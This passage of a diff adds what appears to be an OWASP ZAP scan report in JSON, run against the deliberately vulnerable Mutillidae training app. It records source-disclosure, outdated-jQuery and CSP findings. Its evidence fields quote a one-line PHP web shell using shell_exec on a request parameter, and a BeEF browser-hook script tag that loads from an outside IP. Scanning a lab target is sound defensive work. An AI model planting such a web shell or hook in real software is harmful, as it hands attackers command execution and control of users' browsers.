+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/Mutillidae-Test-Scripts.txt",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<?php echo \"<pre>\";echo shell_exec($_REQUEST[\"pCommand\"]);echo \"</pre>\"; ?>",
+							"otherinfo": ""
+						},
+						{
+							"id": "197",
+							"uri": "http://host.docker.internal:25004/includes/anti-framing-protection.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/anti-framing-protection.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<?php\r\n   \t/* ------------------------------------------\r\n    * ANTI-CLICK-JACKING (Older Browsers)\r\n    * ------------------------------------------ */\r\n  \t/* To prevent click-jacking and IE6 key-log-via-framing issue\r\n  \t * we can instruct the browser that it should not frame our site. \r\n \t * Unfortuneately only the latest browsers support this option.\r\n\t * There are javascript frame-buster options that work reasonably well\r\n\t * although the arms race continues. Use the x-frame-options as the\r\n\t * primary defense and include the javascript frame-buster to help\r\n\t * with older browsers.\r\n\t */\r\n\techo \"<script type=\\\"text/javascript\\\">if(top != self) top.location.replace(location);</script>\";\r\n?>",
+							"otherinfo": ""
+						},
+						{
+							"id": "203",
+							"uri": "http://host.docker.internal:25004/includes/back-button.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/back-button.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<?php\r\n\t\r\n\tswitch ($_SESSION[\"security-level\"]){\r\n   \t\tcase \"0\": // This code is insecure\r\n   \t\tcase \"1\":\r\n   \t\t\t// DO NOTHING: This is insecure\t\t\r\n\t\t\t$lEncodeOutput = FALSE;\r\n\t\tbreak;\r\n   \t\t\t\r\n\t\tcase \"2\":\r\n\t\tcase \"3\":\r\n\t\tcase \"4\":\r\n\t\tcase \"5\": // This code is fairly secure\r\n  \t\t\t/* \r\n  \t\t\t * NOTE: Input validation is excellent but not enough. The output must be\r\n  \t\t\t * encoded per context. For example, if output is placed in HTML,\r\n  \t\t\t * then HTML encode it. Blacklisting is a losing proposition. You \r\n  \t\t\t * cannot blacklist everything. The business requirements will usually\r\n  \t\t\t * require allowing dangerous charaters.Output encoding is the answer. \r\n  \t\t\t * Validate what you can, encode it all.\r\n  \t\t\t */\r\n\t\t\t$lEncodeOutput = TRUE;\r\n   \t\tbreak;\r\n   \t}// end switch\r\n\r\n   \t/* On first request, $_SERVER['HTTP_REFERER'] \r\n   \t * will be null. Bug discovered by Tim Tomes.\r\n   \t */\r\n   \tif(isset($_SERVER['HTTP_REFERER'])){\r\n   \t\t $lHTTPReferer = $_SERVER['HTTP_REFERER'];\r\n   \t}else{\r\n   \t\t$lHTTPReferer = \"index.php?page=home.php&popUpNotificationCode=HPH0\";\r\n   \t}// end if\r\n\r\n   \t/* Encode to defeat JavaScript string injection */\r\n   \tif ($lEncodeOutput) {\r\n   \t\t$lHTTPReferer = $Encoder->encodeForJavaScript($lHTTPReferer);\r\n   \t}// end if\r\n?>\r\n\r\n<?php \r\n\ttry{\r\n   \t\t$lHTMLEventReflectedXSSExecutionPointBallonTip = $BubbleHintHandler->getHint(\"HTMLEventReflectedXSSExecutionPoint\");\r\n\t} catch (Exception $e) {\r\n\t\techo $CustomErrorHandler->FormatError($e, \"Error attempting to execute query to fetch bubble hints.\");\r\n\t}// end try\r\n?>\r\n\r\n<script type=\"text/javascript\">\r\n\t$(function() {\r\n\t\t$('[HTMLEventReflectedXSSExecutionPoint]').attr(\"title\", \"<?php echo $lHTMLEventReflectedXSSExecutionPointBallonTip; ?>",
+							"otherinfo": ""
+						},
+						{
+							"id": "205",
+							"uri": "http://host.docker.internal:25004/includes/create-html-5-web-storage-target.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/create-html-5-web-storage-target.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<?php\r\n\techo \"<script type=\\\"text/javascript\\\">\r\n\t\t\ttry{\r\n\t\t\t\t//if(!window.localStorage.length){\r\n\t\t\t\t\twindow.localStorage.setItem(\\\"SelfDestructSequence1\\\",\\\"Destruct sequence 1, code 1-1A\\\");\r\n\t\t\t\t\twindow.localStorage.setItem(\\\"SelfDestructSequence2\\\",\\\"Destruct sequence 2, code 1-1A-2B\\\");\r\n\t\t\t\t\twindow.localStorage.setItem(\\\"SelfDestructSequence3\\\",\\\"Destruct sequence 3, code 1B-2B-3\\\");\r\n\t\t\t\t\twindow.localStorage.setItem(\\\"MessageOfTheDay\\\",\\\"Go Cats!\\\");\r\n\t\t\t\t\twindow.localStorage.setItem(\\\"SecureMessage\\\",\\\"Shh. Do not tell anyone.\\\");\r\n\t\t\t\t\twindow.localStorage.setItem(\\\"FYI\\\",\\\"A couple of keys are not showing in this list. Why?\\\");\r\n\t\t\t\t//}//end if\r\n\t\t\t\t//if(!window.sessionStorage.length){\r\n\t\t\t\t\twindow.sessionStorage.setItem(\\\"AuthorizationLevel\\\", \\\"0\\\");\r\n\t\t\t\t\twindow.sessionStorage.setItem(\\\"ChuckNorrisJoke1\\\",\\\"When Alexander Bell invented the telephone he had 3 missed calls from Chuck Norris\\\");\r\n\t\t\t\t\twindow.sessionStorage.setItem(\\\"ChuckNorrisJoke2\\\",\\\"Death once had a near-Chuck Norris experience\\\");\r\n\t\t\t\t\twindow.sessionStorage.setItem(\\\"ChuckNorrisJoke3\\\",\\\"He counted to infinity; twice\\\");\r\n\t\t\t\t\twindow.sessionStorage.setItem(\\\"ChuckNorrisJoke4\\\",\\\"Chuck Norris can slam a revolving door\\\");\r\n\t\t\t\t\twindow.sessionStorage.setItem(\\\"ChuckNorrisJoke5\\\",\\\"Chuck Norris can cut through a hot knife with butter\\\");\r\n\t\t\t\t\twindow.sessionStorage.setItem(\\\"SecureKey\\\", \\\"You cannot see me on the HTML5 Storage page. I wonder why?\\\");\r\n\t\t\t\t//}//end if\r\n\t\t\t}catch(e){\r\n\t\t\t\t//alert(e);\r\n\t\t\t\t/* Do nothing. Older browsers do not support HTML5 web storage */\r\n\t\t\t};\r\n\t\t</script>\";\r\n?>",
+							"otherinfo": ""
+						},
+						{
+							"id": "209",
+							"uri": "http://host.docker.internal:25004/includes/help-button.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/help-button.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<?php echo $lPage; ?>",
+							"otherinfo": ""
+						},
+						{
+							"id": "299",
+							"uri": "http://host.docker.internal:25004/includes/hints/application-log-injection.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/hints\/application-log-injection.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->SendingPersistentCrosssiteScriptsintoWebLogstoSnagWebAdmin);?>",
+							"otherinfo": ""
+						},
+						{
+							"id": "300",
+							"uri": "http://host.docker.internal:25004/includes/hints/application-path-disclosure-hint.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/hints\/application-path-disclosure-hint.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontoFuzzingWebApplicationswithBurpSuiteIntruderTool);?>",
+							"otherinfo": ""
+						},
+						{
+							"id": "214",
+							"uri": "http://host.docker.internal:25004/includes/jquery-init.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/jquery-init.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<?php\r\n\techo '<script type=\"text/javascript\" src=\"javascript/jQuery/jquery.js\"></script>';\r\n\techo '<script type=\"text/javascript\" src=\"./javascript/jQuery/jquery.balloon.js\"></script>';\r\n\techo '<script src=\"javascript/jQuery/colorbox/jquery.colorbox-min.js\"></script>';\r\n\techo '<link rel=\"stylesheet\" href=\"javascript/jQuery/colorbox/colorbox.css\" />';\r\n\techo \"\r\n\t<script>\r\n\t\t$(document).ready(function () {\r\n\t\t\t$('a.colorbox').colorbox({width:'700px',opacity:'0.60'});\r\n\t\t});\r\n\t</script>\r\n\t\";\r\n?>",
+							"otherinfo": ""
+						},
+						{
+							"id": "226",
+							"uri": "http://host.docker.internal:25004/includes/pop-up-status-notification.inc",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/pop-up-status-notification.inc",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "$_GET[",
+							"otherinfo": ""
+						}
+					],
+					"count": "9",
+					"systemic": false,
+					"solution": "<p>Ensure that application Source Code is not available with alternative extensions, and ensure that source code is not present within other files or data deployed to the web server, or served by the web server.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://nhimg.org/twitter-breach</p>",
+					"cweid": "540",
+					"wascid": "13",
+					"sourceid": "155"
+				},
+				{
+					"pluginid": "10099",
+					"alertRef": "10099",
+					"alert": "Source Code Disclosure - SQL",
+					"name": "Source Code Disclosure - SQL",
+					"riskcode": "2",
+					"confidence": "2",
+					"riskdesc": "Medium (Medium)",
+					"desc": "<p>Application Source Code was disclosed by the web server. - SQL</p>",
+					"instances":[ 
+						{
+							"id": "16",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "update user set ",
+							"otherinfo": ""
+						},
+						{
+							"id": "72",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "update user set ",
+							"otherinfo": ""
+						},
+						{
+							"id": "155",
+							"uri": "http://host.docker.internal:25004/set-up-database.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/set-up-database.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "SELECT * FROM accounts",
+							"otherinfo": ""
+						},
+						{
+							"id": "156",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php ()(database-offline-php-submit-button)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "update user set ",
+							"otherinfo": ""
+						}
+					],
+					"count": "4",
+					"systemic": false,
+					"solution": "<p>Ensure that application Source Code is not available with alternative extensions, and ensure that source code is not present within other files or data deployed to the web server, or served by the web server.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://nhimg.org/twitter-breach</p>",
+					"cweid": "540",
+					"wascid": "13",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "90003",
+					"alertRef": "90003",
+					"alert": "Sub Resource Integrity Attribute Missing",
+					"name": "Sub Resource Integrity Attribute Missing",
+					"riskcode": "2",
+					"confidence": "3",
+					"riskdesc": "Medium (High)",
+					"desc": "<p>The integrity attribute is missing on a script or link tag served by an external server. The integrity tag prevents an attacker who have gained access to this server from injecting a malicious content.</p>",
+					"instances":[ 
+						{
+							"id": "257",
+							"uri": "http://host.docker.internal:25004/documentation/Mutillidae-Test-Scripts.txt",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/Mutillidae-Test-Scripts.txt",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<script src=\\'http://192.168.56.103/beef/hook/beefmagic.js.php\\'></script>",
+							"otherinfo": ""
+						},
+						{
+							"id": "336",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/functions.js?ts=1526333067",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/functions.js (ts)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<script type=\"text/javascript\" src=\"'+a[b]+'\">",
+							"otherinfo": ""
+						}
+					],
+					"count": "2",
+					"systemic": false,
+					"solution": "<p>Provide a valid integrity attribute to the tag.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Subresource_Integrity</p>",
+					"cweid": "345",
+					"wascid": "15",
+					"sourceid": "155"
+				},
+				{
+					"pluginid": "10003",
+					"alertRef": "10003",
+					"alert": "Vulnerable JS Library",
+					"name": "Vulnerable JS Library",
+					"riskcode": "2",
+					"confidence": "2",
+					"riskdesc": "Medium (Medium)",
+					"desc": "<p>The identified library appears to be vulnerable.</p>",
+					"instances":[ 
+						{
+							"id": "158",
+							"uri": "http://host.docker.internal:25004/javascript/ddsmoothmenu/jquery.min.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/ddsmoothmenu\/jquery.min.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "* jQuery JavaScript Library v1.3.2",
+							"otherinfo": "The identified library jquery, version 1.3.2 is vulnerable.\nCVE-2011-4969\nCVE-2020-11023\nCVE-2019-11358\nCVE-2020-7656\nCVE-2012-6708\nhttps://nvd.nist.gov/vuln/detail/CVE-2012-6708\nhttp://research.insecurelabs.org/jquery/test/\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-11358\nhttps://github.com/jquery/jquery.com/issues/162\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-7656\nhttps://bugs.jquery.com/ticket/9521\nhttp://bugs.jquery.com/ticket/11290\nhttps://research.insecurelabs.org/jquery/test/\nhttps://blog.jquery.com/2019/04/10/jquery-3-4-0-released/\nhttps://github.com/advisories/GHSA-q4m3-2j7h-f7xw\nhttps://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\nhttps://nvd.nist.gov/vuln/detail/CVE-2011-4969\n"
+						},
+						{
+							"id": "164",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "* jQuery JavaScript Library v1.8.3",
+							"otherinfo": "The identified library jquery, version 1.8.3 is vulnerable.\nCVE-2020-11023\nCVE-2015-9251\nCVE-2019-11358\nCVE-2020-7656\nCVE-2012-6708\nhttps://nvd.nist.gov/vuln/detail/CVE-2012-6708\nhttps://github.com/jquery/jquery/issues/2432\nhttp://research.insecurelabs.org/jquery/test/\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-11358\nhttps://github.com/advisories/GHSA-rmxg-73gg-4p98\nhttps://bugs.jquery.com/ticket/11974\nhttps://github.com/jquery/jquery.com/issues/162\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-7656\nhttp://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/\nhttp://bugs.jquery.com/ticket/11290\nhttps://research.insecurelabs.org/jquery/test/\nhttps://blog.jquery.com/2019/04/10/jquery-3-4-0-released/\nhttps://nvd.nist.gov/vuln/detail/CVE-2015-9251\nhttps://github.com/advisories/GHSA-q4m3-2j7h-f7xw\nhttps://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\n"
+						},
+						{
+							"id": "359",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/jquery/jquery-1.6.2.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/jquery\/jquery-1.6.2.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "jquery-1.6.2.js",
+							"otherinfo": "The identified library jquery, version 1.6.2 is vulnerable.\nCVE-2011-4969\nCVE-2020-11023\nCVE-2015-9251\nCVE-2019-11358\nCVE-2020-7656\nCVE-2012-6708\nhttps://nvd.nist.gov/vuln/detail/CVE-2012-6708\nhttps://github.com/jquery/jquery/issues/2432\nhttp://research.insecurelabs.org/jquery/test/\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-11358\nhttps://github.com/advisories/GHSA-rmxg-73gg-4p98\nhttps://github.com/jquery/jquery.com/issues/162\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-7656\nhttps://bugs.jquery.com/ticket/9521\nhttp://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/\nhttp://bugs.jquery.com/ticket/11290\nhttps://research.insecurelabs.org/jquery/test/\nhttps://blog.jquery.com/2019/04/10/jquery-3-4-0-released/\nhttps://nvd.nist.gov/vuln/detail/CVE-2015-9251\nhttps://github.com/advisories/GHSA-q4m3-2j7h-f7xw\nhttps://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\nhttps://nvd.nist.gov/vuln/detail/CVE-2011-4969\n"
+						},
+						{
+							"id": "231",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/js/jquery/jquery-1.6.2.js?ts=1526333067",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/js\/jquery\/jquery-1.6.2.js (ts)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "jquery-1.6.2.js",
+							"otherinfo": "The identified library jquery, version 1.6.2 is vulnerable.\nCVE-2011-4969\nCVE-2020-11023\nCVE-2015-9251\nCVE-2019-11358\nCVE-2020-7656\nCVE-2012-6708\nhttps://nvd.nist.gov/vuln/detail/CVE-2012-6708\nhttps://github.com/jquery/jquery/issues/2432\nhttp://research.insecurelabs.org/jquery/test/\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-11358\nhttps://github.com/advisories/GHSA-rmxg-73gg-4p98\nhttps://github.com/jquery/jquery.com/issues/162\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-7656\nhttps://bugs.jquery.com/ticket/9521\nhttp://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/\nhttp://bugs.jquery.com/ticket/11290\nhttps://research.insecurelabs.org/jquery/test/\nhttps://blog.jquery.com/2019/04/10/jquery-3-4-0-released/\nhttps://nvd.nist.gov/vuln/detail/CVE-2015-9251\nhttps://github.com/advisories/GHSA-q4m3-2j7h-f7xw\nhttps://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b\nhttps://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\nhttps://nvd.nist.gov/vuln/detail/CVE-2011-4969\n"
+						}
+					],
+					"count": "4",
+					"systemic": false,
+					"solution": "<p>Upgrade to the latest version of the affected library.</p>",
+					"otherinfo": "<p>The identified library jquery, version 1.3.2 is vulnerable.</p><p>CVE-2011-4969</p><p>CVE-2020-11023</p><p>CVE-2019-11358</p><p>CVE-2020-7656</p><p>CVE-2012-6708</p><p>https://nvd.nist.gov/vuln/detail/CVE-2012-6708</p><p>http://research.insecurelabs.org/jquery/test/</p><p>https://nvd.nist.gov/vuln/detail/CVE-2019-11358</p><p>https://github.com/jquery/jquery.com/issues/162</p><p>https://nvd.nist.gov/vuln/detail/CVE-2020-7656</p><p>https://bugs.jquery.com/ticket/9521</p><p>http://bugs.jquery.com/ticket/11290</p><p>https://research.insecurelabs.org/jquery/test/</p><p>https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/</p><p>https://github.com/advisories/GHSA-q4m3-2j7h-f7xw</p><p>https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b</p><p>https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/</p><p>https://nvd.nist.gov/vuln/detail/CVE-2011-4969</p><p></p>",
+					"reference": "<p>https://owasp.org/Top10/2021/A06_2021-Vulnerable_and_Outdated_Components/</p>",
+					"cweid": "1395",
+					"wascid": "-1",
+					"sourceid": "353"
+				},
+				{
+					"pluginid": "10044",
+					"alertRef": "10044-1",
+					"alert": "Big Redirect Detected (Potential Sensitive Information Leak)",
+					"name": "Big Redirect Detected (Potential Sensitive Information Leak)",
+					"riskcode": "1",
+					"confidence": "2",
+					"riskdesc": "Low (Medium)",
+					"desc": "<p>The server has responded with a redirect that seems to provide a large response. This may indicate that although the server sent a redirect it also responded with body content (which may include sensitive details, PII, etc.).</p>",
+					"instances":[ 
+						{
+							"id": "157",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php ()(database-offline-php-submit-button)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "Location header URI length: 9 [index.php].\nPredicted response size: 309.\nResponse Body Length: 2,821."
+						}
+					],
+					"count": "1",
+					"systemic": false,
+					"solution": "<p>Ensure that no sensitive information is leaked via redirect responses. Redirect responses should have almost no content.</p>",
+					"otherinfo": "<p>Location header URI length: 9 [index.php].</p><p>Predicted response size: 309.</p><p>Response Body Length: 2,821.</p>",
+					"reference": "",
+					"cweid": "201",
+					"wascid": "13",
+					"sourceid": "351"
+				},
+				{
+					"pluginid": "10055",
+					"alertRef": "10055-1",
+					"alert": "CSP: X-Content-Security-Policy",
+					"name": "CSP: X-Content-Security-Policy",
+					"riskcode": "1",
+					"confidence": "3",
+					"riskdesc": "Low (High)",
+					"desc": "<p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks. Including (but not limited to) Cross Site Scripting (XSS), and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page \u2014 covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>",
+					"instances":[ 
+						{
+							"id": "169",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/",
+							"method": "GET",
+							"param": "X-Content-Security-Policy",
+							"attack": "",
+							"evidence": "allow 'self'; options inline-script eval-script; frame-ancestors 'self'; img-src 'self' data:; script-src 'self' http://www.phpmyadmin.net",
+							"otherinfo": "The header X-Content-Security-Policy was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						},
+						{
+							"id": "239",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "X-Content-Security-Policy",
+							"attack": "",
+							"evidence": "allow 'self'; options inline-script eval-script; frame-ancestors 'self'; img-src 'self' data:; script-src 'self' http://www.phpmyadmin.net",
+							"otherinfo": "The header X-Content-Security-Policy was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						},
+						{
+							"id": "305",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (token)",
+							"method": "GET",
+							"param": "X-Content-Security-Policy",
+							"attack": "",
+							"evidence": "allow 'self'; options inline-script eval-script; frame-ancestors 'self'; img-src 'self' data:; script-src 'self' http://www.phpmyadmin.net",
+							"otherinfo": "The header X-Content-Security-Policy was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						},
+						{
+							"id": "234",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/navigation.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/navigation.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "X-Content-Security-Policy",
+							"attack": "",
+							"evidence": "allow 'self'; options inline-script eval-script; frame-ancestors 'self'; img-src 'self' data:; script-src 'self' http://www.phpmyadmin.net",
+							"otherinfo": "The header X-Content-Security-Policy was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						},
+						{
+							"id": "307",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/querywindow.php?no_js=true&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/querywindow.php (no_js,token)",
+							"method": "GET",
+							"param": "X-Content-Security-Policy",
+							"attack": "",
+							"evidence": "allow 'self'; options inline-script eval-script; frame-ancestors 'self'; img-src 'self' data:; script-src 'self' http://www.phpmyadmin.net",
+							"otherinfo": "The header X-Content-Security-Policy was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.</p>",
+					"otherinfo": "<p>The header X-Content-Security-Policy was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses.</p>",
+					"reference": "<p>https://www.w3.org/TR/CSP/</p><p>https://caniuse.com/#search=content+security+policy</p><p>https://content-security-policy.com/</p><p>https://github.com/HtmlUnit/htmlunit-csp</p><p>https://web.dev/articles/csp#resource-options</p>",
+					"cweid": "693",
+					"wascid": "15",
+					"sourceid": "525"
+				},
+				{
+					"pluginid": "10055",
+					"alertRef": "10055-2",
+					"alert": "CSP: X-WebKit-CSP",
+					"name": "CSP: X-WebKit-CSP",
+					"riskcode": "1",
+					"confidence": "3",
+					"riskdesc": "Low (High)",
+					"desc": "<p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks. Including (but not limited to) Cross Site Scripting (XSS), and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page \u2014 covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>",
+					"instances":[ 
+						{
+							"id": "172",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/",
+							"method": "GET",
+							"param": "X-WebKit-CSP",
+							"attack": "",
+							"evidence": "allow 'self' http://www.phpmyadmin.net; options inline-script eval-script",
+							"otherinfo": "The header X-WebKit-CSP was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						},
+						{
+							"id": "240",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "X-WebKit-CSP",
+							"attack": "",
+							"evidence": "allow 'self' http://www.phpmyadmin.net; options inline-script eval-script",
+							"otherinfo": "The header X-WebKit-CSP was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						},
+						{
+							"id": "306",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (token)",
+							"method": "GET",
+							"param": "X-WebKit-CSP",
+							"attack": "",
+							"evidence": "allow 'self' http://www.phpmyadmin.net; options inline-script eval-script",
+							"otherinfo": "The header X-WebKit-CSP was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						},
+						{
+							"id": "236",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/navigation.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/navigation.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "X-WebKit-CSP",
+							"attack": "",
+							"evidence": "allow 'self' http://www.phpmyadmin.net; options inline-script eval-script",
+							"otherinfo": "The header X-WebKit-CSP was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						},
+						{
+							"id": "308",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/querywindow.php?no_js=true&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/querywindow.php (no_js,token)",
+							"method": "GET",
+							"param": "X-WebKit-CSP",
+							"attack": "",
+							"evidence": "allow 'self' http://www.phpmyadmin.net; options inline-script eval-script",
+							"otherinfo": "The header X-WebKit-CSP was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses."
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header.</p>",
+					"otherinfo": "<p>The header X-WebKit-CSP was found on this response. While it is a good sign that CSP is implemented to some degree the policy specified in this header has not been analyzed by ZAP. To ensure full support by modern browsers ensure that the Content-Security-Policy header is defined and attached to responses.</p>",
